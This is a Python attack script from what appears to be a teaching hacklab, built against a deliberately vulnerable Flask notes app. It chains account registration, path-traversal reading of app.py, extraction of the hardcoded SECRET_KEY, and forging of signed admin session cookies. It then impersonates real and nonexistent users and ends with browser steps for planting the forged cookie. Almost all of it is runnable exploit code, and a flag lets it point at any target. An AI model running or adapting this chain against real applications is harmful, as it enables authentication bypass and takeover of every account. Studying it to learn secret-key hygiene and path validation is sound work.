#!/usr/bin/env python3
"""
Session Cookie Forgery -- Full Chain Attack
============================================

this is the most elegant attack in the hacklab because it bypasses
authentication completely -- no password guessing, no brute force,
no social engineering. the attacker forges a valid admin session cookie
from scratch using only a leaked SECRET_KEY

flask session cookies are NOT encrypted -- they are only SIGNED
this means anyone can read the session data (base64 decode it)
but they cannot modify it without knowing the SECRET_KEY
because the server checks the HMAC-SHA1 signature on every request

the attack chain:
  1. register a throwaway account (any unprivileged user works)
  2. use LFI (/download path traversal) to read app.py from the server
  3. find the SECRET_KEY in the source code ('super-secret-key-123')
  4. use flask's SecureCookieSessionInterface to sign a new cookie
     with {logged_in: True, username: 'admin'} in the session data
  5. set this cookie in the browser -- instant admin access

this is worse than stealing a password because:
  - changing the victim's password does NOT help (the key is still known)
  - the attacker can impersonate ANY user, even ones that don't exist
  - the only fix is rotating the SECRET_KEY, which invalidates ALL sessions
  - if the key is in the source code, it survives deployments and git pushes

the secure version uses secrets.token_hex(32) which generates a random
256-bit key on every startup -- impossible to guess or extract via LFI
(because even if you read the source, you see os.environ.get() not a literal)

usage:
    python3 scripts/session_forgery.py
    python3 scripts/session_forgery.py --target http://127.0.0.1:5000
"""

import argparse
import re
import sys
import time
import os

try:
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface
    import requests
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Run: pip install flask requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"
ATTACKER_USER = "recon_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "recon_pass_2026"

# we try different ../ depths because the /download endpoint's base_dir
# is at static/files/ and we need to reach app.py which is 2-3 levels up
TRAVERSAL_DEPTHS = range(1, 12)


# ──────────────────────────────────────────────
# terminal colors
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    CN = "\033[96m"; B = "\033[1m"; D = "\033[2m"; X = "\033[0m"

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")

def is_login_page(text):
    """checks for the login page by looking for multiple indicators
    a single check like '<title>Login</title>' could false-positive on error pages"""
    indicators = ["<title>Login</title>", "name=\"username\"", "name=\"password\""]
    return sum(1 for i in indicators if i in text) >= 2


# ──────────────────────────────────────────────
# cookie forgery tools
#
# flask uses SecureCookieSessionInterface to sign cookies with HMAC-SHA1
# if we know the SECRET_KEY we can use the exact same mechanism
# to create cookies with any session data we want
#
# forge_cookie: takes a dict and signs it -> returns the cookie string
# decode_cookie: takes a cookie string and verifies+decodes it
# ──────────────────────────────────────────────

def forge_cookie(session_data, secret_key):
    """creates a valid flask session cookie signed with the given key
    we create a temporary flask app just to access the signing mechanism
    the resulting cookie string can be set in the browser directly"""
    app = Flask(__name__)
    app.secret_key = secret_key
    # get_signing_serializer returns the itsdangerous serializer flask uses
    s = SecureCookieSessionInterface().get_signing_serializer(app)
    # dumps() serializes and signs the data -- this is the actual cookie value
    return s.dumps(dict(session_data))

def decode_cookie(cookie_value, secret_key):
    """decodes and verifies an existing flask session cookie
    returns the session dict if the signature is valid
    or an error dict if the key is wrong or the cookie is tampered"""
    app = Flask(__name__)
    app.secret_key = secret_key
    s = SecureCookieSessionInterface().get_signing_serializer(app)
    try:
        return s.loads(cookie_value)
    except Exception as e:
        return {"error": str(e)}


# ──────────────────────────────────────────────
# phase 1 -- register a throwaway account
# we need any valid session to access /download
# the attacker does NOT need admin credentials -- any user works
# ──────────────────────────────────────────────

def phase1_register(session, target):
    banner("PHASE 1 -- Register a Throwaway Account")
    info(f"Creating account: '{ATTACKER_USER}'")

    try:
        resp = session.post(f"{target}/register", data={
            "username": ATTACKER_USER,
            "password": ATTACKER_PASS,
            "confirm": ATTACKER_PASS,
        }, allow_redirects=True, timeout=5)

        if is_login_page(resp.text):
            warn("Registration failed, trying login...")
            resp = session.post(f"{target}/login", data={
                "username": ATTACKER_USER,
                "password": ATTACKER_PASS,
            }, allow_redirects=True, timeout=5)
            if is_login_page(resp.text):
                fail("Could not authenticate")
                return False

        ok(f"Authenticated as '{ATTACKER_USER}'")
        info("This is a low-privilege throwaway account.")
        info("The attacker does not need admin credentials.")
        return True

    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}. Is Flask running?")
        return False


# ──────────────────────────────────────────────
# phase 2 -- read app.py via LFI
# the /download endpoint has no path validation so we can traverse
# out of static/files/ and read any file on the server
# we specifically want app.py because that is where SECRET_KEY lives
# ──────────────────────────────────────────────

def phase2_steal_source(session, target):
    banner("PHASE 2 -- Read Application Source via LFI")
    info("Using /download path traversal to read app.py...")
    print()

    source_code = None

    # try increasing ../ depths until we find app.py
    for depth in TRAVERSAL_DEPTHS:
        traversal = "../" * depth + "app.py"
        url = f"{target}/download?file={traversal}"
        try:
            resp = session.get(url, timeout=5)
            if resp.status_code == 200 and not is_login_page(resp.text):
                # verify we actually got python source code and not an error page
                # by checking for known strings that must exist in app.py
                if "SECRET_KEY" in resp.text and "Flask" in resp.text:
                    ok(f"app.py found at depth {depth}")
                    print(f"       {'../' * depth}app.py")
                    source_code = resp.text
                    break
        except:
            pass

    if not source_code:
        fail("Could not read app.py via LFI")
        return None, None

    lines = source_code.strip().split("\n")
    info(f"Source code: {len(lines)} lines, {len(source_code)} bytes")

    return source_code, lines


# ──────────────────────────────────────────────
# phase 3 -- extract SECRET_KEY from the source code
# we scan every line looking for the SECRET_KEY assignment
# the vulnerable version has it hardcoded as a string literal:
#   app.config['SECRET_KEY'] = 'super-secret-key-123'
# we extract the value between the quotes
# ──────────────────────────────────────────────

def phase3_extract_key(source_code, lines):
    banner("PHASE 3 -- Extract SECRET_KEY from Source Code")
    info("Scanning source for SECRET_KEY assignment...")
    print()

    secret_key = None

    for i, line in enumerate(lines, 1):
        stripped = line.strip()

        # look for lines that assign SECRET_KEY (skip comments)
        if "SECRET_KEY" in stripped and "=" in stripped and not stripped.startswith("#"):
            print(f"  {C.D}  Line {i}:{C.X}  {C.R}{stripped}{C.X}")

            # extract the string value after the = sign
            after_equals = stripped.split("=", 1)[-1].strip()
            match = re.search(r"""['"]([^'"]+)['"]""", after_equals)
            if match:
                secret_key = match.group(1)

        # also highlight other sensitive lines we find (bonus info)
        elif any(kw in stripped.upper() for kw in ["PASSWORD", "USERS", "DATABASE_URI"]) \
                and "=" in stripped and not stripped.startswith("#"):
            print(f"  {C.D}  Line {i}:{C.X}  {C.Y}{stripped}{C.X}")

    print()

    if secret_key:
        ok(f"SECRET_KEY extracted: '{C.R}{secret_key}{C.X}'")
        print()
        info("With this key, the attacker can:")
        print(f"       - Sign any session cookie (forge identities)")
        print(f"       - Decode any stolen cookie (read session data)")
        print(f"       - Bypass ALL authentication permanently")
    else:
        fail("Could not extract SECRET_KEY from source")

    return secret_key


# ──────────────────────────────────────────────
# phase 4 -- forge an admin session cookie
# now that we have the SECRET_KEY we can sign any session data
# we create a cookie that says {logged_in: True, username: 'admin'}
# and send it to the server -- the server trusts it because the signature is valid
# ──────────────────────────────────────────────

def phase4_forge_admin(target, secret_key):
    banner("PHASE 4 -- Forge Admin Session Cookie")

    # the session data we want -- this is what the cookie will contain
    # flask checks session['logged_in'] in before_request to allow access
    # and session['username'] determines which user we appear to be
    admin_session = {
        "logged_in": True,
        "username": "admin",
        "_permanent": True,  # keeps the session alive for PERMANENT_SESSION_LIFETIME
    }

    info("Crafting admin session data:")
    for key, value in admin_session.items():
        print(f"       {key}: {value}")

    print()
    info(f"Signing with stolen key: '{secret_key}'")

    # this is the magic -- we use flask's own signing mechanism
    # with the stolen key to create a valid cookie
    forged = forge_cookie(admin_session, secret_key)

    ok(f"Forged admin cookie:")
    print(f"       {C.G}{forged}{C.X}")

    # verify it works by actually sending it to the server
    print()
    info("Sending forged cookie to server...")

    test = requests.Session()
    test.cookies.set("session", forged, domain="127.0.0.1", path="/")

    # if the server accepts the cookie, we get the welcome page (200)
    # if it rejects it, we get redirected to login (302)
    resp = test.get(f"{target}/", allow_redirects=False)

    if resp.status_code == 200:
        ok(f"COOKIE ACCEPTED -- logged in as admin!")
        ok(f"Server returned 200 (welcome page)")

        # test that we can actually do admin things
        print()
        info("Testing admin actions with forged session...")

        resp2 = test.get(f"{target}/notes", allow_redirects=False)
        if resp2.status_code == 200:
            ok("GET /notes -> 200 (can view all notes)")

        resp3 = test.get(f"{target}/settings", allow_redirects=False)
        if resp3.status_code == 200:
            ok("GET /settings -> 200 (can access admin settings)")

        resp4 = test.get(f"{target}/files", allow_redirects=False)
        if resp4.status_code == 200:
            ok("GET /files -> 200 (can access file downloads)")

    elif resp.status_code == 302:
        fail("Cookie rejected -- redirected to login")
    else:
        info(f"Unexpected response: {resp.status_code}")

    return forged


# ──────────────────────────────────────────────
# phase 5 -- impersonate multiple users
# the scariest part: we can forge cookies for users that dont even exist
# flask's before_request only checks session['logged_in'] == True
# it never verifies that session['username'] corresponds to a real user
# ──────────────────────────────────────────────

def phase5_impersonate_all(target, secret_key):
    banner("PHASE 5 -- Mass Impersonation")
    info("Forging cookies for every possible identity...\n")

    # mix of real users and fake ones to demonstrate the vulnerability
    targets = ["admin", "potato", "root", "ceo", "ghost_user"]

    for uname in targets:
        cookie = forge_cookie(
            {"logged_in": True, "username": uname, "_permanent": True},
            secret_key
        )

        s = requests.Session()
        s.cookies.set("session", cookie, domain="127.0.0.1", path="/")
        resp = s.get(f"{target}/", allow_redirects=False)

        if resp.status_code == 200:
            exists = f"{C.G}ACCESS{C.X}"
        else:
            exists = f"{C.R}DENIED{C.X}"

        # mark which users are real and which are fabricated
        real = uname in ["admin", "potato"]
        tag = "" if real else f"  {C.D}(user doesn't even exist){C.X}"

        print(f"  {exists}  {C.Y}{uname:15s}{C.X}{tag}")

    print()
    warn("'ghost_user' does not exist in the database -- but the server")
    warn("accepted the cookie anyway. before_request only checks")
    warn("session['logged_in'], not whether the user is real.")


# ──────────────────────────────────────────────
# summary
# ──────────────────────────────────────────────

def print_summary(secret_key, forged_cookie, target):
    banner("ATTACK CHAIN SUMMARY")

    print(f"""
  {C.B}Complete chain -- zero prior knowledge needed:{C.X}

  +----------------------------------------------------------+
  |  1. REGISTER   ->  Create a throwaway account             |
  |                    No credentials, no social engineering  |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  2. LFI        ->  Read app.py via /download              |
  |                    ../../../../../../../app.py             |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  3. EXTRACT    ->  Find SECRET_KEY in source code         |
  |                    '{secret_key}'              |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  4. FORGE      ->  Create admin cookie with stolen key    |
  |                    No password, no login, no brute force  |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  5. TAKEOVER   ->  Full admin access                      |
  |                    {C.R}Every account compromised simultaneously{C.X}  |
  +----------------------------------------------------------+

  {C.Y}Why this is worse than stealing a password:{C.X}

    Password stolen   ->  change the password, attacker locked out
    SECRET_KEY stolen  ->  changing passwords does NOTHING
                          attacker forges a new cookie and is back in
                          the only fix is rotating the SECRET_KEY
                          which logs out EVERY user on the platform

  {C.B}Try it yourself:{C.X}

    1. Open {C.CN}{target}/login{C.X} in your browser
    2. Open DevTools (F12) -> Application -> Cookies
    3. Set cookie 'session' to:
       {C.G}{forged_cookie}{C.X}
    4. Refresh -- you are now admin. No password entered.
""")


# ──────────────────────────────────────────────
# main
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Session Cookie Forgery -- Full Chain")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args()
    target = args.target.rstrip("/")

    print(f"""
{C.B}{C.R}
  ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
  █████╗  ██║   ██║██████╔╝██║  ███╗█████╗  
  ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  
  ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{C.X}
  {C.D}Register -> LFI -> Steal SECRET_KEY -> Forge Cookie -> Admin{C.X}
  {C.D}Target: {target}{C.X}
""")

    session = requests.Session()

    time.sleep(0.5)

    if not phase1_register(session, target):
        sys.exit(1)

    time.sleep(0.5)

    source_code, lines = phase2_steal_source(session, target)
    if not source_code:
        sys.exit(1)

    time.sleep(0.5)

    secret_key = phase3_extract_key(source_code, lines)
    if not secret_key:
        fail("Cannot continue without SECRET_KEY")
        sys.exit(1)

    time.sleep(0.5)

    forged = phase4_forge_admin(target, secret_key)

    time.sleep(0.5)

    phase5_impersonate_all(target, secret_key)

    time.sleep(0.5)

    print_summary(secret_key, forged, target)


if __name__ == "__main__":
    main()
